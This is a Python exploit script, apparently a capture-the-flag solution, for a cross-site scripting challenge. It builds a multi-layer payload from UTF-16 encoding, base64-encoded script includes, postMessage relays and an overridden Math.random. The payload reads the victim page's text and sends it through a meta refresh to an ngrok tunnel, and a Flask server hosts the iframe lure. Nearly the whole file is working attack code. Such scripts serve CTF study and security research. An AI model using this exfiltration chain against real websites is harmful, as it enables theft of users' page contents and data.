import asyncio
import httpx
from pyngrok import ngrok
from flask import Flask
from threading import Thread
from urllib.parse import quote

from base64 import b64encode as b64e

PORT = 4444
TUNNEL = ngrok.connect(PORT, "tcp").public_url.replace("tcp://", "http://")

print("TUNNEL:", TUNNEL)

URL = "http://proxy/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, verify=False)

class API(BaseAPI):
    ...

def webServer(html):
    app = Flask(__name__)
    @app.get("/")
    def home():
        return html
    return Thread(target=app.run, args=('0.0.0.0', PORT))

def b64encode(b):
    return b64e(b).decode()

def toUTF16(p):
    # https://ctftime.org/writeup/16642
    payload = b""
    for i in p:
        if type(i) == str:
            payload += eval(f"b'\\x{ord(i):02x}\\x00'")
        else :
            payload += eval(f"b'\\x{i:02x}\\x00'")
    return payload

def toHexSlashes(p):
    result = ""
    maptext = {
        "'" : "\\'",
        '"' : '\\"',
    }
    for i in p:
        if p in maptext:
            result += maptext[p]
        else:
            result += i
    return result

async def main():
    t1base64 = b64encode(f""" s.location.replace(frameElement.src);setTimeout(()=>top.document.head.innerHTML="<meta http-equiv=\\"refresh\\" content=\\"0; "+'{TUNNEL}/xx/?foo=asd&'+s.document.body.innerText+"\\">",1000)""".encode())
    t0base64 = b64encode(("""(async( )=>{w=open('/?html=A'); w.Math.random=()=>1; w.postMessage({ },"*"); await new Promise( (res) =>setTimeout(res , 1000) );w.postMessage({random:1,html:"<iframe name='s'></iframe>  <script src='/hi/?dynamic_content="""+ t1base64 +"""'></script>"},"*")})()""").encode())
    assert "+" not in t1base64
    print(t0base64)
    assert "+" not in t0base64
    t0 = toHexSlashes(f""" <script src="/hi/?dynamic_content={t0base64}"></script>""")
    t00 = toUTF16("""  window.onmessage=(e)=>{parent.postMessage({"random": e.data.random, "html":'""")
    t00 += toUTF16(t0)
    t00 += toUTF16("""'},"*")};""")
    t00base64 = b64encode(t00)
    assert "+" not in t00base64
    payload = b"\xff\xfe"
    payload += toUTF16(f"""<script src="{URL}/""")
    payload += toUTF16(f"""/hi/?dynamic_content={t00base64}""")
    payload += toUTF16("""\"></script>""")
    url = URL+"?html="+quote(b64encode(payload))
    server = webServer(f"""
<iframe src='{url}' sandbox='allow-popups allow-scripts allow-same-origin allow-top-navigation'></iframe>
""")
    server.start()
    server.join()

if __name__ == "__main__":
    asyncio.run(main())
